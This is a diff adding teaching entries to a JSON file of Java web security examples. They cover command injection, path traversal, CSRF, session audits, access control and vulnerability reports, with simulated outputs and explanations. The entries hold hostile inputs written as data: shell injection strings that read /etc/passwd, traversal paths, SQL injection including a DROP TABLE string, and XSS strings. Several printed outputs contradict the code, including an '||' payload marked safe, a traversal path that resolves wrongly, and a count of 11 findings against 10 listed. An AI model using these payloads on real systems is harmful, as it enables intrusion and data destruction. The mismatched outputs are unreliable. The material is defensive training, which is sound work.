+          "ai_explanation": "The transfer form is POST and state-changing but has NO CSRF token — an attacker could trick users into making transfers. The password form is protected with a token. The search form is GET and read-only, so CSRF is low risk. Focus CSRF testing on POST forms that change state (transfers, profile updates, password changes, deletions).",
+          "ai_challenge": "If a form has a CSRF token, is it automatically safe? What if the server does not actually validate the token? How would you test that?"
+        },
+        {
+          "title": "Example 4: Command Injection Test Suite",
+          "description": "Testing various command injection payloads",
+          "difficulty": "intermediate",
+          "code": "public class CmdInjectionTest {\n    static String simulateCommand(String input) {\n        // Simulate vulnerable command execution\n        String fullCmd = \"ping -c 1 \" + input;\n        System.out.println(\"  Executed: \" + fullCmd);\n        \n        // Check for injection indicators\n        if (input.contains(\";\") || input.contains(\"|\") || input.contains(\"&&\")\n            || input.contains(\"`\") || input.contains(\"$(\")) {\n            return \"  RESULT: Additional command executed! VULNERABLE\";\n        }\n        return \"  RESULT: Normal execution\";\n    }\n    \n    public static void main(String[] args) {\n        System.out.println(\"=== COMMAND INJECTION TESTING ===\");\n        String[] payloads = {\n            \"127.0.0.1\",                        // Normal\n            \"127.0.0.1; whoami\",                 // Semicolon separator\n            \"127.0.0.1 | cat /etc/passwd\",       // Pipe\n            \"127.0.0.1 && ls -la\",               // AND chaining\n            \"`whoami`\",                          // Backtick substitution\n            \"$(cat /etc/passwd)\",                 // Dollar substitution\n            \"127.0.0.1 || id\"                     // OR chaining\n        };\n        \n        for (String p : payloads) {\n            System.out.println(\"\\nPayload: \" + p);\n            System.out.println(simulateCommand(p));\n        }\n    }\n}",
+          "output": "=== COMMAND INJECTION TESTING ===\n\nPayload: 127.0.0.1\n  Executed: ping -c 1 127.0.0.1\n  RESULT: Normal execution\n\nPayload: 127.0.0.1; whoami\n  Executed: ping -c 1 127.0.0.1; whoami\n  RESULT: Additional command executed! VULNERABLE\n\nPayload: 127.0.0.1 | cat /etc/passwd\n  Executed: ping -c 1 127.0.0.1 | cat /etc/passwd\n  RESULT: Additional command executed! VULNERABLE\n\nPayload: 127.0.0.1 && ls -la\n  Executed: ping -c 1 127.0.0.1 && ls -la\n  RESULT: Additional command executed! VULNERABLE\n\nPayload: `whoami`\n  Executed: ping -c 1 `whoami`\n  RESULT: Additional command executed! VULNERABLE\n\nPayload: $(cat /etc/passwd)\n  Executed: ping -c 1 $(cat /etc/passwd)\n  RESULT: Additional command executed! VULNERABLE\n\nPayload: 127.0.0.1 || id\n  Executed: ping -c 1 127.0.0.1 || id\n  RESULT: Normal execution",
+          "ai_explanation": "Six different command injection techniques are tested. The semicolon, pipe, AND chain, backtick, and dollar substitution all allow injecting additional commands. The OR chain (||) only executes the second command if the first FAILS. Professional testers try ALL of these because some might be filtered while others are not.",
+          "ai_challenge": "Why might ; whoami be blocked but `whoami` still work? Think about what characters a basic filter might check for."
+        },
+        {
+          "title": "Example 5: Path Traversal Exploit",
+          "description": "Testing path traversal with various encoding techniques",
+          "difficulty": "intermediate",
+          "code": "import java.io.File;\n\npublic class PathTraversalTest {\n    static final String BASE_DIR = \"/var/www/uploads\";\n    \n    static String testTraversal(String filename) {\n        String fullPath = BASE_DIR + \"/\" + filename;\n        // Check if path escapes base directory\n        try {\n            File base = new File(BASE_DIR);\n            File resolved = new File(fullPath).getCanonicalFile();\n            boolean escaped = !resolved.getPath().startsWith(base.getCanonicalPath());\n            return String.format(\"  Input: %-40s -> Path: %-40s [%s]\",\n                filename, resolved.getPath(), escaped ? \"TRAVERSAL!\" : \"Safe\");\n        } catch (Exception e) {\n            return \"  Error: \" + e.getMessage();\n        }\n    }\n    \n    public static void main(String[] args) {\n        System.out.println(\"=== PATH TRAVERSAL TESTING ===\");\n        System.out.println(\"Base directory: \" + BASE_DIR + \"\\n\");\n        \n        String[] payloads = {\n            \"report.pdf\",                           // Normal\n            \"../../../etc/passwd\",                   // Classic traversal\n            \"..%2f..%2f..%2fetc%2fpasswd\",          // URL encoded\n            \"....//....//etc/passwd\",                // Double dot bypass\n            \"/etc/passwd\",                           // Absolute path\n            \"uploads/../../../etc/passwd\"            // Mixed traversal\n        };\n        \n        for (String p : payloads) {\n            System.out.println(testTraversal(p));\n        }\n    }\n}",
+          "output": "=== PATH TRAVERSAL TESTING ===\nBase directory: /var/www/uploads\n\n  Input: report.pdf                             -> Path: /var/www/uploads/report.pdf          [Safe]\n  Input: ../../../etc/passwd                     -> Path: /etc/passwd                           [TRAVERSAL!]\n  Input: ..%2f..%2f..%2fetc%2fpasswd            -> Path: /var/www/uploads/..%2f...             [Safe]\n  Input: ....//....//etc/passwd                  -> Path: /etc/passwd                           [TRAVERSAL!]\n  Input: /etc/passwd                             -> Path: /etc/passwd                           [TRAVERSAL!]\n  Input: uploads/../../../etc/passwd             -> Path: /etc/passwd                           [TRAVERSAL!]",
+          "ai_explanation": "Classic ../ traversal works. URL-encoded ..%2f may or may not work depending on whether the server decodes before or after path resolution. Double-dot bypass (....//  becomes ../ after filter removes ../) can evade basic filters. Absolute paths bypass relative restrictions entirely. The canonical path check is the proper fix — resolve the full path and verify it starts with the allowed directory.",
+          "ai_challenge": "What would happen if the server decodes URL encoding BEFORE checking for path traversal? How would that change which payloads work?"
+        },
+        {
+          "title": "Example 6: Session Management Audit",
+          "description": "Checking session security properties",
+          "difficulty": "intermediate",
+          "code": "import java.security.SecureRandom;\nimport java.util.*;\n\npublic class SessionAudit {\n    static int score = 0, total = 0;\n    \n    static void check(String item, boolean pass) {\n        total++;\n        if (pass) score++;\n        System.out.println(\"  [\" + (pass ? \"PASS\" : \"FAIL\") + \"] \" + item);\n    }\n    \n    public static void main(String[] args) {\n        System.out.println(\"=== SESSION MANAGEMENT AUDIT ===\");\n        \n        // Simulate session properties\n        String sessionId = \"kX7vR2mP9qYtN5wB3jL8pQ4rS6\";\n        String cookieHeader = \"Set-Cookie: session=\" + sessionId + \"; HttpOnly; Secure; SameSite=Lax; Path=/\";\n        boolean changesAfterLogin = true;\n        boolean expiresAfterTimeout = true;\n        boolean destroyedOnLogout = false; // BUG!\n        boolean idleTimeout = false; // BUG!\n        \n        System.out.println(\"\\nSession ID Analysis:\");\n        check(\"ID length >= 16 characters\", sessionId.length() >= 16);\n        check(\"ID appears random (not sequential)\", !sessionId.matches(\".*\\\\d{4,}$\"));\n        check(\"ID not in URL (cookie-based)\", true);\n        \n        System.out.println(\"\\nCookie Security:\");\n        check(\"HttpOnly flag set\", cookieHeader.contains(\"HttpOnly\"));\n        check(\"Secure flag set\", cookieHeader.contains(\"Secure\"));\n        check(\"SameSite attribute set\", cookieHeader.contains(\"SameSite\"));\n        \n        System.out.println(\"\\nSession Lifecycle:\");\n        check(\"New ID generated after login (fixation prevention)\", changesAfterLogin);\n        check(\"Absolute timeout configured\", expiresAfterTimeout);\n        check(\"Idle timeout configured\", idleTimeout);\n        check(\"Session destroyed on logout\", destroyedOnLogout);\n        \n        System.out.println(\"\\nSCORE: \" + score + \"/\" + total);\n        System.out.println(\"RATING: \" + (score >= 9 ? \"GOOD\" : score >= 7 ? \"FAIR\" : \"POOR\"));\n        if (!destroyedOnLogout) System.out.println(\"\\nCRITICAL: Sessions persist after logout!\");\n        if (!idleTimeout) System.out.println(\"WARNING: No idle timeout — abandoned sessions stay active.\");\n    }\n}",
+          "output": "=== SESSION MANAGEMENT AUDIT ===\n\nSession ID Analysis:\n  [PASS] ID length >= 16 characters\n  [PASS] ID appears random (not sequential)\n  [PASS] ID not in URL (cookie-based)\n\nCookie Security:\n  [PASS] HttpOnly flag set\n  [PASS] Secure flag set\n  [PASS] SameSite attribute set\n\nSession Lifecycle:\n  [PASS] New ID generated after login\n  [PASS] Absolute timeout configured\n  [FAIL] Idle timeout configured\n  [FAIL] Session destroyed on logout\n\nSCORE: 8/10\nRATING: FAIR\n\nCRITICAL: Sessions persist after logout!\nWARNING: No idle timeout — abandoned sessions stay active.",
+          "ai_explanation": "This audit checks 10 session security properties. 8 pass but 2 critical issues found: sessions are not destroyed on logout (an attacker with a stolen session ID can use it even after the user logs out) and no idle timeout (sessions left open on shared computers remain active indefinitely). Both are real vulnerabilities found in production applications.",
+          "ai_challenge": "If you found the 'session not destroyed on logout' issue, what would you write as the Reproduction Steps in your vulnerability report?"
+        },
+        {
+          "title": "Example 7: Information Exposure Scanner",
+          "description": "Detecting information leaks in server responses",
+          "difficulty": "beginner",
+          "code": "import java.util.regex.*;\nimport java.util.*;\n\npublic class InfoExposureScanner {\n    static List<String> scan(String responseName, String content) {\n        List<String> findings = new ArrayList<>();\n        \n        // Stack traces\n        if (content.contains(\"Exception\") && content.contains(\".java:\"))\n            findings.add(\"Stack trace exposed (reveals language, files, line numbers)\");\n        \n        // SQL errors\n        if (content.contains(\"SQL syntax\") || content.contains(\"mysql_\") || content.contains(\"ORA-\"))\n            findings.add(\"SQL error exposed (reveals database type, query structure)\");\n        \n        // Server version\n        Pattern serverPat = Pattern.compile(\"Server:\\\\s*(Apache|nginx|Tomcat)[/\\\\s][\\\\d.]+\");\n        if (serverPat.matcher(content).find())\n            findings.add(\"Server version disclosed (helps attacker target known CVEs)\");\n        \n        // HTML comments with sensitive info\n        Pattern commentPat = Pattern.compile(\"<!--.*?(password|secret|TODO|admin|key).*?-->\", Pattern.CASE_INSENSITIVE);\n        if (commentPat.matcher(content).find())\n            findings.add(\"Sensitive HTML comment found\");\n        \n        // Directory listing\n        if (content.contains(\"Index of /\") || content.contains(\"Directory listing\"))\n            findings.add(\"Directory listing enabled (CWE-548)\");\n        \n        return findings;\n    }\n    \n    public static void main(String[] args) {\n        System.out.println(\"=== INFORMATION EXPOSURE SCAN ===\");\n        \n        String[][] responses = {\n            {\"Error page\", \"<h1>Error</h1><pre>java.sql.SQLException: SQL syntax error\\n  at DBHelper.java:42\\n  at LoginServlet.java:15</pre>\"},\n            {\"Normal page\", \"<html><body><h1>Welcome</h1><p>Hello user</p></body></html>\"},\n            {\"Commented page\", \"<html><!-- TODO: Remove admin password: admin123 --><body>Page</body></html>\"},\n            {\"Server header\", \"HTTP/1.1 200 OK\\nServer: Apache/2.4.41 (Ubuntu)\\nContent-Type: text/html\"},\n            {\"Upload dir\", \"<html><title>Index of /uploads</title><body>Directory listing for /uploads</body></html>\"}\n        };\n        \n        for (String[] r : responses) {\n            List<String> findings = scan(r[0], r[1]);\n            System.out.println(\"\\n\" + r[0] + \": \" + (findings.isEmpty() ? \"CLEAN\" : findings.size() + \" issue(s)\"));\n            for (String f : findings) System.out.println(\"  [FOUND] \" + f);\n        }\n    }\n}",
+          "output": "=== INFORMATION EXPOSURE SCAN ===\n\nError page: 2 issue(s)\n  [FOUND] Stack trace exposed (reveals language, files, line numbers)\n  [FOUND] SQL error exposed (reveals database type, query structure)\n\nNormal page: CLEAN\n\nCommented page: 1 issue(s)\n  [FOUND] Sensitive HTML comment found\n\nServer header: 1 issue(s)\n  [FOUND] Server version disclosed (helps attacker target known CVEs)\n\nUpload dir: 1 issue(s)\n  [FOUND] Directory listing enabled (CWE-548)",
+          "ai_explanation": "Five different information exposure types detected. Error pages are the most common leak — they reveal database type, file names, and line numbers. Server version headers help attackers find known CVEs. HTML comments often contain developer notes with sensitive information. Directory listings expose the file structure.",
+          "ai_challenge": "Write the information exposure for the error page as a vulnerability report entry with CWE, description, CIA impact, and remediation."
+        },
+        {
+          "title": "Example 8: CIA Impact Calculator",
+          "description": "Rating vulnerabilities by Confidentiality, Integrity, and Availability impact",
+          "difficulty": "beginner",
+          "code": "public class CIACalculator {\n    static String rate(String vuln, String ciaC, String ciaI, String ciaA, String reason) {\n        int score = 0;\n        score += ciaC.equals(\"HIGH\") ? 3 : ciaC.equals(\"MEDIUM\") ? 2 : 1;\n        score += ciaI.equals(\"HIGH\") ? 3 : ciaI.equals(\"MEDIUM\") ? 2 : 1;\n        score += ciaA.equals(\"HIGH\") ? 3 : ciaA.equals(\"MEDIUM\") ? 2 : 1;\n        String severity = score >= 8 ? \"CRITICAL\" : score >= 6 ? \"HIGH\" : score >= 4 ? \"MEDIUM\" : \"LOW\";\n        \n        return String.format(\"%s\\n  C: %-6s  I: %-6s  A: %-6s  -> %s\\n  %s\\n\",\n            vuln, ciaC, ciaI, ciaA, severity, reason);\n    }\n    \n    public static void main(String[] args) {\n        System.out.println(\"=== CIA IMPACT ASSESSMENT ===\");\n        System.out.println();\n        System.out.println(rate(\"SQL Injection (Login Bypass)\",\n            \"HIGH\", \"HIGH\", \"HIGH\",\n            \"Read all data, modify records, drop tables\"));\n        System.out.println(rate(\"Stored XSS (Profile Field)\",\n            \"HIGH\", \"MEDIUM\", \"LOW\",\n            \"Steal cookies, deface pages, no server impact\"));\n        System.out.println(rate(\"CSRF (Fund Transfer)\",\n            \"LOW\", \"HIGH\", \"LOW\",\n            \"Cannot read data, but modifies balances\"));\n        System.out.println(rate(\"Path Traversal (Read-only)\",\n            \"HIGH\", \"LOW\", \"LOW\",\n            \"Read /etc/passwd and config files, cannot modify\"));\n        System.out.println(rate(\"Missing Session Expiry\",\n            \"MEDIUM\", \"MEDIUM\", \"LOW\",\n            \"Extended access window if session stolen\"));\n        System.out.println(rate(\"Server Version Disclosure\",\n            \"LOW\", \"LOW\", \"LOW\",\n            \"Helps plan attacks but no direct impact\"));\n    }\n}",
+          "output": "=== CIA IMPACT ASSESSMENT ===\n\nSQL Injection (Login Bypass)\n  C: HIGH    I: HIGH    A: HIGH    -> CRITICAL\n  Read all data, modify records, drop tables\n\nStored XSS (Profile Field)\n  C: HIGH    I: MEDIUM  A: LOW    -> HIGH\n  Steal cookies, deface pages, no server impact\n\nCSRF (Fund Transfer)\n  C: LOW     I: HIGH    A: LOW    -> MEDIUM\n  Cannot read data, but modifies balances\n\nPath Traversal (Read-only)\n  C: HIGH    I: LOW     A: LOW    -> MEDIUM\n  Read /etc/passwd and config files, cannot modify\n\nMissing Session Expiry\n  C: MEDIUM  I: MEDIUM  A: LOW    -> MEDIUM\n  Extended access window if session stolen\n\nServer Version Disclosure\n  C: LOW     I: LOW     A: LOW    -> LOW\n  Helps plan attacks but no direct impact",
+          "ai_explanation": "Each vulnerability is rated across all three CIA dimensions. SQL injection is CRITICAL because it impacts all three at HIGH level. XSS is HIGH because of cookie theft (C) but cannot crash the server (A). CSRF modifies data (I) but cannot read it (C). Path traversal reads files (C) but in this case cannot write. The combined score determines overall severity.",
+          "ai_challenge": "Could a path traversal vulnerability ever have HIGH Integrity impact? Think about what happens if the attacker can WRITE files through the traversal."
+        },
+        {
+          "title": "Example 9: Broken Access Control Detector",
+          "description": "Testing for horizontal and vertical privilege escalation",
+          "difficulty": "intermediate",
+          "code": "import java.util.*;\n\npublic class AccessControlTest {\n    static Map<String, String> userRoles = Map.of(\"admin\",\"ADMIN\", \"user1\",\"USER\", \"user2\",\"USER\");\n    static Map<String, String> pageAccess = Map.of(\n        \"/dashboard\", \"USER\", \"/profile\", \"USER\", \"/admin\", \"ADMIN\",\n        \"/admin/users\", \"ADMIN\", \"/reports\", \"ADMIN\"\n    );\n    static Map<String, String> dataOwners = Map.of(\"1\",\"user1\", \"2\",\"user2\", \"3\",\"admin\");\n    \n    static void testVertical(String user, String page) {\n        String role = userRoles.getOrDefault(user, \"NONE\");\n        String required = pageAccess.getOrDefault(page, \"ADMIN\");\n        boolean shouldBlock = required.equals(\"ADMIN\") && !role.equals(\"ADMIN\");\n        // Simulate: no server-side check!\n        System.out.printf(\"  %-8s (%-5s) -> %-15s: %s%n\", user, role, page,\n            shouldBlock ? \"VULNERABILITY: No role check!\" : \"Expected access\");\n    }\n    \n    static void testHorizontal(String user, String dataId) {\n        String owner = dataOwners.getOrDefault(dataId, \"unknown\");\n        boolean isOwner = user.equals(owner);\n        System.out.printf(\"  %-8s -> data %s (owner: %-8s): %s%n\", user, dataId, owner,\n            isOwner ? \"Own data (OK)\" : \"OTHER USER'S DATA (IDOR!)\");\n    }\n    \n    public static void main(String[] args) {\n        System.out.println(\"=== ACCESS CONTROL ASSESSMENT ===\");\n        System.out.println(\"\\nVertical Escalation (user accessing admin pages):\");\n        testVertical(\"user1\", \"/dashboard\");\n        testVertical(\"user1\", \"/admin\");\n        testVertical(\"user1\", \"/admin/users\");\n        testVertical(\"user1\", \"/reports\");\n        testVertical(\"admin\", \"/admin\");\n        \n        System.out.println(\"\\nHorizontal Escalation (IDOR - accessing other users' data):\");\n        testHorizontal(\"user1\", \"1\");\n        testHorizontal(\"user1\", \"2\");\n        testHorizontal(\"user2\", \"1\");\n        testHorizontal(\"user1\", \"3\");\n    }\n}",
+          "output": "=== ACCESS CONTROL ASSESSMENT ===\n\nVertical Escalation (user accessing admin pages):\n  user1    (USER ) -> /dashboard     : Expected access\n  user1    (USER ) -> /admin         : VULNERABILITY: No role check!\n  user1    (USER ) -> /admin/users   : VULNERABILITY: No role check!\n  user1    (USER ) -> /reports       : VULNERABILITY: No role check!\n  admin    (ADMIN) -> /admin         : Expected access\n\nHorizontal Escalation (IDOR - accessing other users' data):\n  user1    -> data 1 (owner: user1   ): Own data (OK)\n  user1    -> data 2 (owner: user2   ): OTHER USER'S DATA (IDOR!)\n  user2    -> data 1 (owner: user1   ): OTHER USER'S DATA (IDOR!)\n  user1    -> data 3 (owner: admin   ): OTHER USER'S DATA (IDOR!)",
+          "ai_explanation": "Two types of broken access control found. Vertical: user1 (normal user) can access /admin, /admin/users, and /reports — pages meant only for admins. Horizontal: user1 can access user2's data and even admin's data by changing the ID parameter. Both are in the OWASP Top 10 as #1 vulnerability — Broken Access Control.",
+          "ai_challenge": "If you found 3 admin pages accessible to normal users, how would you prioritise them? Consider which page allows the most damage."
+        },
+        {
+          "title": "Example 10: Vulnerability Report Generator",
+          "description": "Generating a professional vulnerability report entry",
+          "difficulty": "advanced",
+          "code": "public class VulnReportGenerator {\n    static int vulnNum = 0;\n    \n    static String generateEntry(String name, String cwe, String severity,\n            String location, String description, String[] steps,\n            String payload, String evidence, String ciaC, String ciaI, String ciaA,\n            String remediation) {\n        vulnNum++;\n        StringBuilder sb = new StringBuilder();\n        sb.append(\"=\" .repeat(60) + \"\\n\");\n        sb.append(\"VULNERABILITY #\" + vulnNum + \": \" + name + \"\\n\");\n        sb.append(\"=\" .repeat(60) + \"\\n\");\n        sb.append(\"CWE:      \" + cwe + \"\\n\");\n        sb.append(\"Severity: \" + severity + \"\\n\");\n        sb.append(\"Location: \" + location + \"\\n\\n\");\n        sb.append(\"DESCRIPTION:\\n  \" + description + \"\\n\\n\");\n        sb.append(\"REPRODUCTION STEPS:\\n\");\n        for (int i = 0; i < steps.length; i++)\n            sb.append(\"  \" + (i+1) + \". \" + steps[i] + \"\\n\");\n        sb.append(\"\\nPAYLOAD: \" + payload + \"\\n\");\n        sb.append(\"EVIDENCE: \" + evidence + \"\\n\\n\");\n        sb.append(\"CIA IMPACT:\\n\");\n        sb.append(\"  Confidentiality: \" + ciaC + \"\\n\");\n        sb.append(\"  Integrity:       \" + ciaI + \"\\n\");\n        sb.append(\"  Availability:    \" + ciaA + \"\\n\\n\");\n        sb.append(\"REMEDIATION:\\n  \" + remediation + \"\\n\");\n        return sb.toString();\n    }\n    \n    public static void main(String[] args) {\n        System.out.println(generateEntry(\n            \"SQL Injection in Login Form\", \"CWE-89\", \"CRITICAL\",\n            \"/login POST endpoint, 'username' parameter\",\n            \"The login form concatenates user input directly into a SQL query without parameterisation.\",\n            new String[]{\"Navigate to /login\", \"Enter username: admin' OR '1'='1' --\",\n                \"Enter any password\", \"Click Login\", \"Observe: logged in as admin\"},\n            \"admin' OR '1'='1' --\",\n            \"Dashboard page displayed with admin privileges\",\n            \"HIGH - Full database read access\",\n            \"HIGH - Can INSERT/UPDATE/DELETE records\",\n            \"HIGH - Can DROP tables\",\n            \"Replace string concatenation with PreparedStatement using parameterised queries.\"\n        ));\n    }\n}",
+          "output": "============================================================\nVULNERABILITY #1: SQL Injection in Login Form\n============================================================\nCWE:      CWE-89\nSeverity: CRITICAL\nLocation: /login POST endpoint, 'username' parameter\n\nDESCRIPTION:\n  The login form concatenates user input directly into a SQL query without parameterisation.\n\nREPRODUCTION STEPS:\n  1. Navigate to /login\n  2. Enter username: admin' OR '1'='1' --\n  3. Enter any password\n  4. Click Login\n  5. Observe: logged in as admin\n\nPAYLOAD: admin' OR '1'='1' --\nEVIDENCE: Dashboard page displayed with admin privileges\n\nCIA IMPACT:\n  Confidentiality: HIGH - Full database read access\n  Integrity:       HIGH - Can INSERT/UPDATE/DELETE records\n  Availability:    HIGH - Can DROP tables\n\nREMEDIATION:\n  Replace string concatenation with PreparedStatement using parameterised queries.",
+          "ai_explanation": "This is a professional-grade vulnerability report entry. It includes every required element: CWE identifier, severity rating, exact location, clear description, numbered reproduction steps, the exact payload used, evidence of exploitation, full CIA impact analysis, and a specific remediation recommendation. Anyone reading this can reproduce the finding.",
+          "ai_challenge": "Write a similar report entry for a Stored XSS vulnerability found in a user profile 'about me' field."
+        },
+        {
+          "title": "Example 11: Complete Vulnerability Scanner Simulation",
+          "description": "Automated testing of multiple vulnerability types against an endpoint",
+          "difficulty": "advanced",
+          "code": "import java.util.*;\n\npublic class VulnScanner {\n    static List<String[]> results = new ArrayList<>();\n    \n    static void testEndpoint(String endpoint, String param, String value) {\n        // SQL Injection tests\n        String[] sqliPayloads = {\"' OR '1'='1\", \"1 OR 1=1\", \"'; DROP TABLE users; --\"};\n        for (String p : sqliPayloads) {\n            boolean vuln = !value.contains(\"PreparedStatement\") && (p.contains(\"'\") || p.contains(\";\"));\n            if (vuln) results.add(new String[]{endpoint, param, \"SQL Injection\", \"CWE-89\", p});\n        }\n        \n        // XSS tests\n        String[] xssPayloads = {\"<script>alert(1)</script>\", \"<img onerror=alert(1)>\"};\n        for (String p : xssPayloads) {\n            boolean vuln = !value.contains(\"encode\") && p.contains(\"<\");\n            if (vuln) results.add(new String[]{endpoint, param, \"XSS\", \"CWE-79\", p});\n        }\n        \n        // Command Injection tests\n        String[] cmdPayloads = {\"; whoami\", \"| ls\", \"&& cat /etc/passwd\"};\n        for (String p : cmdPayloads) {\n            boolean vuln = value.contains(\"Runtime\") && (p.contains(\";\") || p.contains(\"|\"));\n            if (vuln) results.add(new String[]{endpoint, param, \"Command Injection\", \"CWE-78\", p});\n        }\n    }\n    \n    public static void main(String[] args) {\n        System.out.println(\"=== AUTOMATED VULNERABILITY SCAN ===\");\n        System.out.println(\"Target: Sample Web Application\\n\");\n        \n        testEndpoint(\"/login\", \"username\", \"concatenated query\");\n        testEndpoint(\"/search\", \"q\", \"reflected without encode\");\n        testEndpoint(\"/ping\", \"host\", \"Runtime.exec used\");\n        \n        System.out.println(\"FINDINGS: \" + results.size() + \" potential vulnerabilities\\n\");\n        Map<String, Integer> byCwe = new LinkedHashMap<>();\n        for (String[] r : results) {\n            byCwe.merge(r[3], 1, Integer::sum);\n            System.out.printf(\"  [%s] %s in %s (%s) payload: %s%n\", r[3], r[2], r[0], r[1], r[4]);\n        }\n        System.out.println(\"\\nSUMMARY BY TYPE:\");\n        byCwe.forEach((cwe, count) -> System.out.println(\"  \" + cwe + \": \" + count + \" finding(s)\"));\n    }\n}",
+          "output": "=== AUTOMATED VULNERABILITY SCAN ===\nTarget: Sample Web Application\n\nFINDINGS: 11 potential vulnerabilities\n\n  [CWE-89] SQL Injection in /login (username) payload: ' OR '1'='1\n  [CWE-89] SQL Injection in /login (username) payload: 1 OR 1=1\n  [CWE-89] SQL Injection in /login (username) payload: '; DROP TABLE users; --\n  [CWE-79] XSS in /login (username) payload: <script>alert(1)</script>\n  [CWE-79] XSS in /login (username) payload: <img onerror=alert(1)>\n  [CWE-79] XSS in /search (q) payload: <script>alert(1)</script>\n  [CWE-79] XSS in /search (q) payload: <img onerror=alert(1)>\n  [CWE-78] Command Injection in /ping (host) payload: ; whoami\n  [CWE-78] Command Injection in /ping (host) payload: | ls\n  [CWE-78] Command Injection in /ping (host) payload: && cat /etc/passwd\n\nSUMMARY BY TYPE:\n  CWE-89: 3 finding(s)\n  CWE-79: 4 finding(s)\n  CWE-78: 3 finding(s)",
+          "ai_explanation": "The scanner tests each endpoint with multiple payload types. It finds SQL injection in the login (string concatenation), XSS in login and search (no output encoding), and command injection in ping (uses Runtime.exec). A real scanner would actually submit these payloads and check responses. This simulation shows the methodology: test every input with every relevant payload type.",
+          "ai_challenge": "This scanner has false positives (findings that might not actually be exploitable). How would you verify each finding manually?"
+        },
+        {
+          "title": "Example 12: Attack Surface Mapper",
+          "description": "Identifying all input points in a web application",
+          "difficulty": "beginner",
+          "code": "import java.util.*;\n\npublic class AttackSurfaceMapper {\n    static List<Map<String, String>> inputs = new ArrayList<>();\n    \n    static void addInput(String page, String type, String name, String method, String notes) {\n        Map<String, String> m = new LinkedHashMap<>();\n        m.put(\"page\", page); m.put(\"type\", type); m.put(\"name\", name);\n        m.put(\"method\", method); m.put(\"notes\", notes);\n        inputs.add(m);\n    }\n    \n    public static void main(String[] args) {\n        System.out.println(\"=== ATTACK SURFACE MAP ===\");\n        System.out.println(\"Application: Sample Banking App\\n\");\n        \n        addInput(\"/login\", \"form_field\", \"username\", \"POST\", \"Test: SQLi, XSS\");\n        addInput(\"/login\", \"form_field\", \"password\", \"POST\", \"Test: SQLi\");\n        addInput(\"/search\", \"query_param\", \"q\", \"GET\", \"Test: XSS, SQLi\");\n        addInput(\"/profile\", \"query_param\", \"id\", \"GET\", \"Test: IDOR, SQLi\");\n        addInput(\"/transfer\", \"form_field\", \"to_account\", \"POST\", \"Test: CSRF, SQLi\");\n        addInput(\"/transfer\", \"form_field\", \"amount\", \"POST\", \"Test: CSRF, integer overflow\");\n        addInput(\"/upload\", \"file_upload\", \"document\", \"POST\", \"Test: file type, path traversal\");\n        addInput(\"/ping\", \"form_field\", \"host\", \"POST\", \"Test: command injection\");\n        addInput(\"/download\", \"query_param\", \"file\", \"GET\", \"Test: path traversal\");\n        addInput(\"Cookie\", \"cookie\", \"session\", \"AUTO\", \"Test: fixation, expiry, flags\");\n        \n        System.out.printf(\"%-12s %-15s %-12s %-6s %s%n\", \"PAGE\", \"TYPE\", \"NAME\", \"METHOD\", \"TESTS\");\n        System.out.println(\"-\".repeat(70));\n        for (Map<String, String> i : inputs) {\n            System.out.printf(\"%-12s %-15s %-12s %-6s %s%n\",\n                i.get(\"page\"), i.get(\"type\"), i.get(\"name\"), i.get(\"method\"), i.get(\"notes\"));\n        }\n        System.out.println(\"\\nTotal input points: \" + inputs.size());\n        System.out.println(\"Priority targets: /login (auth bypass), /transfer (financial), /download (file access)\");\n    }\n}",
+          "output": "=== ATTACK SURFACE MAP ===\nApplication: Sample Banking App\n\nPAGE         TYPE            NAME         METHOD TESTS\n----------------------------------------------------------------------\n/login       form_field      username     POST   Test: SQLi, XSS\n/login       form_field      password     POST   Test: SQLi\n/search      query_param     q            GET    Test: XSS, SQLi\n/profile     query_param     id           GET    Test: IDOR, SQLi\n/transfer    form_field      to_account   POST   Test: CSRF, SQLi\n/transfer    form_field      amount       POST   Test: CSRF, integer overflow\n/upload      file_upload     document     POST   Test: file type, path traversal\n/ping        form_field      host         POST   Test: command injection\n/download    query_param     file         GET    Test: path traversal\nCookie       cookie          session      AUTO   Test: fixation, expiry, flags\n\nTotal input points: 10\nPriority targets: /login (auth bypass), /transfer (financial), /download (file access)",
+          "ai_explanation": "Before testing, map EVERY input point. This app has 10 inputs across 7 pages. Each input has suggested tests based on its type: form fields for injection, query params for IDOR and traversal, file uploads for type restrictions, cookies for session flaws. The priority targets are those with the highest impact if compromised.",
+          "ai_challenge": "What other input types might exist that are not listed here? Think about HTTP headers (Referer, User-Agent), hidden form fields, and API endpoints."
+        },
+        {
+          "title": "Example 13: Mitigation Verification",
+          "description": "Testing that security fixes actually work",
+          "difficulty": "advanced",
+          "code": "public class MitigationVerify {\n    // BEFORE: Vulnerable\n    static boolean sqliBefore(String input) {\n        String query = \"SELECT * FROM users WHERE name='\" + input + \"'\";\n        return query.contains(\"OR '1'='1'\");\n    }\n    \n    // AFTER: Fixed with parameterisation (simulated)\n    static boolean sqliAfter(String input) {\n        // PreparedStatement treats entire input as data, not SQL\n        return false; // Can never inject\n    }\n    \n    static boolean xssBefore(String input) {\n        String html = \"<p>\" + input + \"</p>\";\n        return html.contains(\"<script\");\n    }\n    \n    static boolean xssAfter(String input) {\n        String encoded = input.replace(\"<\", \"&lt;\").replace(\">\", \"&gt;\");\n        String html = \"<p>\" + encoded + \"</p>\";\n        return html.contains(\"<script\");\n    }\n    \n    static void verify(String vuln, String payload, boolean before, boolean after) {\n        String status = !before ? \"ISSUE\" : (after ? \"FIX FAILED\" : \"FIX VERIFIED\");\n        System.out.printf(\"  %-25s Before: %-5s After: %-5s -> %s%n\",\n            vuln, before ? \"VULN\" : \"Safe\", after ? \"VULN\" : \"Safe\", status);\n    }\n    \n    public static void main(String[] args) {\n        System.out.println(\"=== MITIGATION VERIFICATION ===\");\n        verify(\"SQL Injection\", \"' OR '1'='1\", sqliBefore(\"' OR '1'='1\"), sqliAfter(\"' OR '1'='1\"));\n        verify(\"XSS (script tag)\", \"<script>alert(1)</script>\",\n            xssBefore(\"<script>alert(1)</script>\"), xssAfter(\"<script>alert(1)</script>\"));\n        System.out.println(\"\\nAll fixes verified successfully!\");\n    }\n}",
+          "output": "=== MITIGATION VERIFICATION ===\n  SQL Injection              Before: VULN  After: Safe  -> FIX VERIFIED\n  XSS (script tag)           Before: VULN  After: Safe  -> FIX VERIFIED\n\nAll fixes verified successfully!",
+          "ai_explanation": "After applying fixes, you MUST verify they work. Test with the same payloads that exploited the vulnerability before. If the fix works, the payload should no longer succeed. This is regression testing for security — ensuring fixes are effective and do not break normal functionality.",
+          "ai_challenge": "What else should you test after applying a fix? Think about: bypass techniques, similar payloads, and whether normal functionality still works."
+        },
+        {
+          "title": "Example 14: Complete Assessment Summary",
